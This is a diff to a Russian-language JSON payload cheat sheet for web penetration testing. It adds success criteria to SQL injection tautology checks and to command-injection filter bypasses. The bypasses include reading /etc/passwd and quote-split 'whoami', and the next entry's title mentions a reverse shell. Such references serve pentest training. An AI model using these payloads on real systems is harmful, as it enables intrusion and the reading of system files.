@@ -73,10 +73,11 @@
           "success": "появляется/исчезает 500 или 'error in your SQL syntax'"
         },
         {
-          "title": "Подтверждаем инъекцию логикой",
+          "title": "Подтверждаем инъекцию логикой (tautology)",
           "kind": "payload",
           "q": "SQL Injection",
-          "detail": "id=1' AND 1=1-- -  (норма)  vs  id=1' AND 1=2-- -  (строки исчезли)"
+          "detail": "id=1' AND 1=1-- -  (норма)  vs  id=1' AND 1=2-- -  (строки исчезли)",
+          "success": "одинаковый ответ на 1=1 и пустой на 1=2 — tautology подтверждает SQLi"
         },
         {
           "title": "Считаем колонки",
@@ -257,10 +258,11 @@
           "detail": "cat${IFS}/etc/passwd   |   {cat,/etc/passwd}   |   cat</etc/passwd"
         },
         {
-          "title": "Обход фильтра ключевых слов",
+          "title": "Обход фильтра ключевых слов (разбивка кавычками)",
           "kind": "payload",
           "q": "Command Injection",
-          "detail": "w'h'o'am'i   |   who$@ami   |   /???/??t /???/p??s??"
+          "detail": "w'h'o'am'i   |   who$@ami   |   /???/??t /???/p??s??",
+          "success": "фильтр не видит whoami — имя команды разбито кавычками/глоб-маской"
         },
         {
           "title": "Дропаем reverse shell",
